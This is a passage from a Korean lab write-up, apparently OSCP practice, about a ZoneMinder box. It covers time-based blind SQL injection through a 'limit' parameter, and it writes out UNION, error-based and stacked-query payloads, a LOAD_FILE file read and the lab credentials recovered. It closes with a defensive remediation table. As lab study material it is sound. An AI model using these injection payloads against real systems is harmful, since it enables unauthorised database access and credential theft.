**`.php`는 서버에서 실행되므로 브라우저로는 빈 결과**만 온다. 소스를 보려면 ① `.phps` 확장자, ② PHP 필터 LFI, ③ **`LOAD_FILE`(SQLi 경유)** 같은 우회가 필요하다. 여기서는 SQLi가 이미 있었으므로 `LOAD_FILE('/var/www/.../zm/includes/config.php')`로 원문(`zmuser:zmpass`)을 읽었다(3-6).

> [!warning] "파일명이 보인다 ≠ 내용이 보인다"
> 디렉터리 리스팅으로 노출되는 건 **이름**이다. 실행형 확장자(`.php`·`.jsp`·`.aspx`)의 **내용**은 별도 우회가 필요하다. 반대로 `.bak`·`.txt`·`.old`·`~`로 끝나는 파일이 보이면 그건 **소스가 그대로** 나온다 — 리스팅에서 이런 확장자를 먼저 노린다.

### 6-4. blind SQLi 임계값 튜닝 — 지터에 속지 않기

처음 `DELAY`를 너무 짧게(예: 0.2초) 잡으면 네트워크 지터(왕복 0.084초 + 서버 부하)와 SLEEP이 구분되지 않아 **거짓 양성**이 난다. 반대로 5초로 두면 정확하지만 236요청 × 절반이 5초면 **10분**이 걸린다. 균형점:

- `DELAY=0.6`, 판정 임계 `0.40`. baseline(~0.09s)과 sleep(0.6s) 사이에 임계가 있어 **지터에 안전하면서도 빠르다.**
- 값이 흔들리면 각 조건을 **2~3회 재요청해 다수결**하는 방어를 추가한다(`blind.py`엔 없지만, 원격 지연이 심하면 넣는다).

> [!warning] blind SQLi가 이상하게 나오면 임계값부터 의심
> 추출 문자열에 깨진 글자가 섞이면 코드 버그가 아니라 **타이밍 오판**인 경우가 많다. ① `DELAY`를 키우고, ② 임계값을 baseline과 DELAY의 중간으로, ③ 조건당 다수결. 그래도 안 되면 네트워크가 아니라 **주입이 실제로 안 되는 것**을 의심(주석 문자·따옴표 컨텍스트 재점검).

### 6-5. UNION·에러 기반을 먼저 시도했다 실패한 흔적

정석대로 **UNION부터** 시도했다. `limit`은 `LIMIT` 절 뒤에 오므로:

```
limit=1 UNION SELECT 1               # LIMIT 1 UNION ... → 문맥 충돌
limit=1 UNION SELECT 1,2,3,4,5,6,7   # 컬럼 수 브루트포스 — 응답 변화 없음
```

`LIMIT` 절 뒤는 이미 SELECT가 완성된 자리라 `UNION`을 자연스럽게 끼우기 어렵고, 컬럼 수를 맞춰도 **응답 본문이 안 바뀌어** 결과를 눈으로 확인할 수 없었다. 에러 기반(`AND extractvalue(1,concat(0x7e,version()))`)도 **에러가 렌더되지 않아** 무소득. **여기서 UNION/에러에 매달리는 것이 함정**이다 — 응답이 안 변하는 순간 채널을 time으로 갈아탄다(2-5). `;SELECT SLEEP(5)#` 한 방으로 스택이 확인되자 나머지는 `blind.py`가 처리했다.

> [!warning] "SQLi는 찾았는데 데이터가 안 나온다"의 정체
> 취약점이 있어도 **추출 채널이 안 맞으면** 아무것도 못 뽑는다. 이걸 "SQLi가 아니었나?" 로 오판하고 되돌아가면 시간을 크게 버린다. **주입 성립 확인(참/거짓 신호가 하나라도 있는가)** 과 **추출 채널 선택**을 분리해서 생각한다. 여기서는 `SLEEP` 지연이라는 신호 하나로 주입을 확정하고, 채널은 time으로 고정했다.

### 6-6. 주입 지점이 둘이다 — 어느 쪽을 쓸지

`limit` SQLi는 **`view=events`(hidden 필드로 존재)** 와 **`view=filter`(사용자가 직접 넣는 입력)** 두 곳에 노출된다. 게다가 `blind.py`는 세 번째 경로인 **`view=request&request=log&task=query`(로그 조회 API)** 를 골랐다. 셋 다 같은 취약점이지만 고른 이유:

- `view=events`는 `limit`이 **hidden 필드**라 정상 폼에선 안 보이지만 POST 바디에 직접 넣으면 먹는다.
- `view=filter`는 필터 UI가 복잡한 파라미터를 함께 요구해 요청이 지저분해진다.
- **로그 조회 API가 가장 단순**하다 — `limit` 하나만 받고 부수효과(이벤트 생성 등)가 없어 수백 요청을 반복해도 안전하다. blind에는 **가장 조용하고 반복 가능한 엔드포인트**를 고르는 게 정답이다.

> [!tip] 같은 취약점이 여러 파라미터에 있으면 "가장 단순·조용한" 곳을 쓴다
> blind는 수백~수천 요청을 던진다. 부수효과가 있는 엔드포인트(글쓰기·상태변경)를 쓰면 DB가 오염되거나 앱이 느려진다. **입력이 적고 read-only인 경로**를 고르면 반복이 안전하고 디버깅도 쉽다.

### 6-7. FTP·SSH에서 시간 쓰지 않기

`vsftpd 3.0.3`을 보고 백도어(2.3.4)를 떠올려 시간을 쓸 수 있는데, **버전이 다르다.** 익명 로그인도 530으로 거부됐다. `OpenSSH 7.2p2`도 사용자명 열거 CVE(CVE-2016-6210)가 있지만 크리덴셜이 없으면 소득이 적다. **웹(`/zm/`)에 명백한 진입점이 있으므로 FTP/SSH는 빠르게 접는 게 맞다.** 신호가 강한 쪽부터 판다.

---

## 7. OSCP 시험 관점

1. **blind SQLi 스크립트를 미리 준비하라.** `blind.py`처럼 "엔드포인트·주입위치·페이로드 템플릿"만 상단에 두고 나머지(이진 탐색·길이·추출)는 고정인 스크립트를 **시험 전에 손에 익혀** 둔다. 낯선 박스에서 5분 안에 파라미터만 바꿔 돌릴 수 있어야 한다.
2. **sqlmap 금지의 정면 대비.** 자동 도구가 하는 일(탐지→판별→길이→추출→파일읽기)을 3-7 표처럼 손으로 매핑해 두면, sqlmap 없이도 같은 결과를 낸다.
3. **스택 쿼리 가능 여부를 백엔드로 먼저 판단.** PHP+mysqli면 `;`가 열릴 수 있고(여기), Java+JDBC면 기본 막힘([[Hawat]]). `;SELECT SLEEP()` 한 방으로 즉시 확인 — 되면 `INTO OUTFILE`·UDF까지 열린다.
4. **관리 앱은 로그인 없이 내부 view부터 찔러 본다.** ZoneMinder처럼 인증이 옵션인 앱이 흔하다. `canEdit*=true`가 클라이언트에 내려오면 이미 관리자다.
5. **배너 위장을 실제 동작으로 걷어낸다.** 8080 Tomcat 미끼처럼, 서버헤더와 앱배너가 엇갈리면 특유 파일을 던져 **실행되는지**로 정체를 확정한다.
6. **포트가 여럿이면 동일 루트인지 md5로 대조** — 열거 노동을 3배로 늘리지 않는다.
7. **목표가 파일 하나면 셸을 만들지 마라.** `LOAD_FILE`로 읽는 게 UDF보다 빠르고 실패 지점이 적다. 단, **시험 증거는 셸+한화면 스샷**이 필요하니 "점수용 셸"과 "정보 획득"을 구분한다.

> [!tip] 시간 배분 — 어디서 손절했어야 하나
> - **8080 Tomcat 파기**: `/manager/html` 404 + `/hello.php` 소스 노출을 본 순간 접는다. 여기서 10분 이상 쓰면 함정에 빠진 것.
> - **FTP/SSH**: 익명 530 + 버전 무해를 확인하면 즉시 접고 웹으로.
> - **UDF 시도**: 플래그가 파일 하나면 아예 시작하지 않는다.
> - **SQLi 추출이 안 붙으면**: 30분 넘기지 말고 임계값·주석문자·컨텍스트를 재점검. 코드가 아니라 **타이밍/컨텍스트**가 원인일 때가 많다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| `limit` 파라미터 SQL 인젝션 | 정수 파라미터는 `intval()`/캐스팅으로 강제하고, 쿼리는 프리페어드 스테이트먼트 바인딩. `LIMIT`은 바인딩이 까다로우니 **정수 화이트리스트**로 검증 |
| **스택 쿼리 허용** | 애플리케이션에서 다중문 실행 함수(`mysqli_multi_query`) 사용 금지. 단일문 API로 고정하면 세미콜론 주입의 파괴력이 급감 |
| ZoneMinder 인증 비활성 | `ZM_OPT_USE_AUTH=1`로 인증 강제, 강한 관리자 비밀번호(`password` 금지) |
| DB 계정 `FILE` 권한 | 애플리케이션 계정(`zmuser`)에서 `FILE` 회수, `secure_file_priv`를 빈 값이 아닌 특정 디렉터리로 고정 → `LOAD_FILE`/`INTO OUTFILE` 차단 |
| MySQL이 root로 구동 | 비특권 계정으로 구동해 UDF RCE가 root로 번지지 않게 |
| 디렉터리 리스팅 활성 | `Options -Indexes` |
| 미끼 8080 / 오픈 프록시 배너 | 불필요한 vhost·프록시 메서드 비활성. 공격 표면과 혼란만 늘린다 |
| 구버전 스택(Ubuntu 16.04, ZM 1.29.0) | EOL. OS·앱 모두 최신 지원 버전으로 |

---

## 9. 참고 자료

- ZoneMinder `limit` SQL Injection: `[가정]` EDB "ZoneMinder 1.29/1.30 - Multiple SQL Injections" 계열(정확한 CVE는 재확인 필요)
- MySQL `LOAD_FILE` / `secure_file_priv`: https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file
- MySQL UDF RCE(`lib_mysqludf_sys`): sqlmap `udf/` 및 `sys_exec` 문서
- Time-based blind SQLi 개념: OWASP "Blind SQL Injection"
- `mysqli_multi_query` 다중문: https://www.php.net/manual/en/mysqli.multi-query.php

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `blind.py`로 던진 수백 건의 SQL 로그(ZM `Logs` 테이블) | 남아 있음 — 랩 Stop/Revert로 소멸 |
| DB 읽기만 수행(쓰기·UDF 없음) | 파일시스템 변경 없음 |

획득 자격증명: MySQL `zmuser:zmpass`, ZoneMinder `admin`(해시 `*4ACFE...9441` = `password`).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hawat]] — SQLi + blind + `INTO OUTFILE`. **JDBC라 스택 쿼리(`;`)가 막힌** 정반대 사례. 이 노트의 2-4와 짝으로 읽을 것
- [[Squid]] — `INTO DUMPFILE` + hex 리터럴로 바이너리(웹셸) 쓰기. UDF `.so` 주입과 같은 패턴
- [[Crane]] · [[Astronaut]] · [[Exghost]] — "응답이 성공을 뜻하지 않는다"(여기선 "배너가 정체를 뜻하지 않는다"로 확장)
- [[Hub]] — 서비스가 root로 구동되는 권한상승 패턴
- [[Cobbles]] — **자매 ZoneMinder 박스(1.34.23).** 같은 `OPT_USE_AUTH` off 무인증 진입, RCE는 SQLi가 아니라 Filter `AutoExecuteCmd` 명령 실행(PHP7 느슨비교 타입저글링 우회)
